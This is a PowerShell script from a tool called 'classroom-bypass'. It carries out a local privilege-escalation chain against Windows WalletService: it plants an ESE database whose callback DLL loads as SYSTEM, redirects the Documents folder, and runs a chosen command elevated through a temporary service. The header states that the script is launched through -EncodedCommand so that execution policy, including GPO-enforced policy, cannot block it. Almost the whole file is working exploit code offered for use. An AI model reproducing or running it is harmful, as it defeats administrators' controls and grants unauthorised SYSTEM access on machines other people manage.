# ============================================================
#  trigger.ps1 -- WalletService auto-elevation (CVE-2026-49176)
#
#  Invoked by bin\bypass.exe (mode=lpe).  The chain:
#
#    A standard user seeds a Wallet ESE database whose persisted callback
#    points at a DLL, redirects the Documents known folder to that run
#    directory, then asks the Wallet API for the store.  WalletService (running
#    as LocalSystem) opens <Documents>\Wallet\wallet.db with persisted
#    callbacks enabled, ESE loads the DLL as SYSTEM, and that DLL creates a
#    demand-start service which runs shell_broker.exe.  The broker launches
#    "command.txt" in the interactive session (High-integrity user token when
#    possible, SYSTEM otherwise) and writes result.txt.
#
#  Everything is undone afterwards: the Documents known folder is restored in
#  the finally block, the service is deleted by the callback DLL, and the run
#  directory stays under %LOCALAPPDATA% for inspection.
#
#  This file is part of the classroom-bypass tool, not of the original PoC;
#  the differences are the target plumbing and the progress markers.
#
#  INPUTS (all optional; bypass.exe injects them):
#    $Repo          directory holding this script + the payload binaries
#    $TargetCommand the command line to run elevated (preferred)
#    $JobFile       legacy alternative: file whose first line is the command
#    $TimeoutSec    how long to wait for the SYSTEM shell event (default 45)
#
#  Progress goes straight into the shared log (..\bypass_hook.log, the file
#  next to bypass.exe) - there are no separate stage/status files.
#
#  bypass.exe runs this through -EncodedCommand, so an execution policy that
#  forbids *.ps1 files (including a GPO-enforced one) cannot block it.  Running
#  it by hand still works:
#    powershell -NoProfile -ExecutionPolicy Bypass -File .\trigger.ps1 `
#        -TargetCommand '"C:\path\bin\bypass.exe"'
# ============================================================

# NO param() block on purpose.  With -EncodedCommand the launcher prepends
#   $Repo='...';$TargetCommand='...';$TimeoutSec=45;
# and param() must be the FIRST statement of a script block - with variables in
# front it is parsed as "call the command `param`" and the whole script fails
# (that is exactly what broke the LPE on 2026-11-16 18:12).  Manual runs pass
# the same names after -File; the CRT hands them over in $args, parsed here.
$ErrorActionPreference = 'Stop'
# Keep the redirected-output log readable: progress records are what turn
# stdout into a CLIXML dump.
$ProgressPreference = 'SilentlyContinue'

for ($i = 0; $i -lt $args.Count; $i++) {
    switch -Regex ([string]$args[$i]) {
        '^-TargetCommand$' { $TargetCommand = [string]$args[$i + 1]; $i++ }
        '^-JobFile$'       { $JobFile       = [string]$args[$i + 1]; $i++ }
        '^-TimeoutSec$'    { $TimeoutSec    = [int]$args[$i + 1];    $i++ }
    }
}

if (-not $Repo) { $Repo = $PSScriptRoot }
if (-not $TimeoutSec) { $TimeoutSec = 45 }
$HookLog = Join-Path (Split-Path -Parent $Repo) 'bypass_hook.log'

$seed      = Join-Path $Repo 'wallet_ese_seed.exe'
$callback  = Join-Path $Repo 'wallet_callback_shell.dll'
$broker    = Join-Path $Repo 'shell_broker.exe'
$documents = Join-Path $Repo 'documents_path.exe'

function Set-Stage([string]$text) {
    # Progress goes into the shared log (ANSI, same code page as the DLL
    # lines) and to the console for humans running the script by hand.
    # Explicit share flags: the launcher keeps the same file open for its own
    # ELog lines and for the redirected stdout of this process.
    try {
        $fs = [IO.File]::Open($HookLog, [IO.FileMode]::Append,
                              [IO.FileAccess]::Write,
                              [IO.FileShare]'ReadWrite, Delete')
        $bytes = [Text.Encoding]::Default.GetBytes("[elevate] $text`r`n")
        $fs.Write($bytes, 0, $bytes.Length)
        $fs.Close()
    } catch { }
    if (-not [Console]::IsOutputRedirected) {
        Write-Host "[*] $text"
    }
}

Set-Stage "start repo=$Repo"
Set-Stage "timeout=$TimeoutSec"

foreach ($file in @($seed, $callback, $broker, $documents)) {
    if (-not (Test-Path -LiteralPath $file -PathType Leaf)) {
        Set-Stage "missing $file"
        exit 2
    }
}

$commandLine = $TargetCommand
if (-not $commandLine -and $JobFile) {
    if (-not (Test-Path -LiteralPath $JobFile -PathType Leaf)) {
        Set-Stage "missing job file $JobFile"
        exit 2
    }
    $commandLine = (Get-Content -Raw -LiteralPath $JobFile -Encoding Unicode).Trim()
}
if (-not $commandLine) {
    Set-Stage 'no target command (-TargetCommand or -JobFile)'
    exit 2
}

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
Set-Stage "user=$($identity.Name)"
Set-Stage "target=$commandLine"
Set-Stage "policy=$((Get-ExecutionPolicy).ToString())"

function Await-WinRtOperation($Operation, [Type]$ResultType) {
    $method = [System.WindowsRuntimeSystemExtensions].GetMethods() |
        Where-Object { $_.Name -eq 'AsTask' -and $_.IsGenericMethodDefinition -and $_.GetParameters().Count -eq 1 } |
        Select-Object -First 1
    $task = $method.MakeGenericMethod($ResultType).Invoke($null, @($Operation))
    if (-not $task.Wait(30000)) { throw 'Wallet RequestStoreAsync timed out.' }
    if ($task.IsFaulted) { throw $task.Exception }
    $task.Result
}

$runId   = [Guid]::NewGuid().ToString('N')
$root    = Join-Path $env:LOCALAPPDATA "ClassroomBypass-LPE\$runId"
$wallet  = Join-Path $root 'Wallet'
$payload = Join-Path $root 'payload'
$cb      = Join-Path $payload 'wallet_callback_shell.dll'
$bk      = Join-Path $payload 'shell_broker.exe'
$result  = Join-Path $payload 'result.txt'
$cmdFile = Join-Path $payload 'command.txt'

New-Item -ItemType Directory -Path $wallet, $payload -Force | Out-Null
Copy-Item -LiteralPath $callback -Destination $cb
Copy-Item -LiteralPath $broker -Destination $bk
[IO.File]::WriteAllText($cmdFile, $commandLine, [Text.Encoding]::Unicode)
Set-Stage "run dir $root"

$database = Join-Path $wallet 'wallet.db'
$callbackSpec = $cb + '!WalletCallback'
& $seed $wallet $database $callbackSpec
if ($LASTEXITCODE -ne 0) {
    Set-Stage "seeding failed exit=$LASTEXITCODE"
    exit 3
}
Set-Stage 'database seeded'

$record = $null
# Read the known folder in-process instead of parsing documents_path.exe's
# stdout: its wprintf goes through the CRT "C" locale, which drops non-ASCII
# (a Chinese user name came back as C:\Users\\Documents).  .NET returns the
# same FOLDERID_Documents as a UTF-16 string, so nothing is ever narrowed.
$original = [Environment]::GetFolderPath([Environment+SpecialFolder]::MyDocuments)
if (-not $original) {
    Set-Stage 'could not read the Documents path'
    exit 4
}

# A previous run that died between "set" and "restore" leaves Documents pointing
# into the LPE temp root.  Capturing that as "original" would restore the stale
# redirect forever (and the wallet callback would seed into the wrong folder).
#
# There is no recorded origin: SHSetKnownFolderPath overwrites the only copy
# (User Shell Folders\Personal), and it does that even when the call fails, so
# this is a best guess, not the real value.  OneDrive first, because a
# known-folder-move profile usually keeps an empty leftover
# %USERPROFILE%\Documents that would win a plain "does it exist" test.
# A user who relocated Documents anywhere else (D:\MyDocs, a share) cannot be
# recovered this way - that is why an empty candidate list refuses to run
# rather than overwriting the last usable copy with a new $root.
$lpeRoot = Join-Path $env:LOCALAPPDATA 'ClassroomBypass-LPE'
if ($original.TrimEnd('\') -like "$lpeRoot*") {
    $candidates = @()
    if ($env:OneDrive)         { $candidates += (Join-Path $env:OneDrive 'Documents') }
    if ($env:OneDriveConsumer) { $candidates += (Join-Path $env:OneDriveConsumer 'Documents') }
    $candidates += (Join-Path $env:USERPROFILE 'Documents')
    Set-Stage "documents stale redirect -> candidates: $($candidates -join ' | ')"
    $original = $candidates |
        Where-Object { Test-Path -LiteralPath $_ -PathType Container } |
        Select-Object -First 1
    if (-not $original) {
        Set-Stage 'stale redirect under the LPE root and no candidate to restore - refusing to run'
        exit 4
    }
    Set-Stage "documents stale redirect under LPE root -> using $original"
} elseif (-not (Test-Path -LiteralPath $original -PathType Container)) {
    # The per-user value is not validated when it is read, so it can name a
    # path that no longer exists (unplugged drive, deleted folder, or an older
    # build's lossy "original").  Restoring that would be worse than not
    # starting: set does not roll back, it would install the dead path.
    Set-Stage "documents path is not a directory, refusing to run: $original"
    exit 4
}
Set-Stage "documents original=$original"

try {
    # The exit code is the whole check now.  SHSetKnownFolderPath returns S_OK
    # only after writing User Shell Folders and notifying the shell;
    # documents_path.exe maps FAILED(hr) to a non-zero exit.  Comparing the
    # echoed path would compare against the same lossy stdout we stopped
    # reading - and it also cannot detect the call's real failure mode, since a
    # failed set has already written the bad value.
    & $documents set $root | Out-Null
    if ($LASTEXITCODE -ne 0) {
        Set-Stage "documents redirection failed (exit $LASTEXITCODE)"
        exit 5
    }
    Set-Stage 'documents redirected, asking the Wallet API'

    Add-Type -AssemblyName System.Runtime.WindowsRuntime
    $manager = [Windows.ApplicationModel.Wallet.WalletManager, Windows.ApplicationModel.Wallet, ContentType = WindowsRuntime]
    $storeType = [Windows.ApplicationModel.Wallet.WalletItemStore, Windows.ApplicationModel.Wallet, ContentType = WindowsRuntime]
    $store = Await-WinRtOperation ($manager::RequestStoreAsync()) $storeType
    $operation = $store.GetItemsAsync()
    Set-Stage 'wallet request issued, waiting for result.txt'

    $deadline = [DateTime]::UtcNow.AddSeconds($TimeoutSec)
    do {
        Start-Sleep -Milliseconds 200
        if (Test-Path -LiteralPath $result) {
            # Every writer to result.txt (callback DLL and shell_broker) appends
            # plain ASCII - the default reader is exactly what the pipeline expects.
            $record = Get-Content -LiteralPath $result |
                Where-Object { $_ -match '^event=SYSTEM_SHELL_(STARTED|FAILED) ' } |
                Select-Object -Last 1
        }
    } while (-not $record -and [DateTime]::UtcNow -lt $deadline)
} catch {
    Set-Stage "exception: $($_.Exception.Message)"
    throw
} finally {
    # $original was checked with Test-Path before the redirect, so this cannot
    # install a dead path (a failed set writes anyway and does not roll back).
    & $documents set $original | Out-Null
    if ($LASTEXITCODE -ne 0) {
        Set-Stage "WARNING documents restore failed (exit $LASTEXITCODE): $original"
    } else {
        Set-Stage 'documents restored'
    }
}

if (-not $record) {
    if (Test-Path -LiteralPath $result) {
        Get-Content -LiteralPath $result | Select-Object -Last 12 |
            ForEach-Object { Set-Stage "result: $_" }
    }
    Set-Stage 'no shell result was received'
    exit 6
}
if ($record -match '^event=SYSTEM_SHELL_FAILED ') {
    Set-Stage "shell failed: $record"
    # the broker writes note= lines (which API failed, with its error code)
    if (Test-Path -LiteralPath $result) {
        Get-Content -LiteralPath $result | Select-Object -Last 12 |
            ForEach-Object { Set-Stage "result: $_" }
    }
    exit 7
}

Set-Stage "shell started: $record"
exit 0
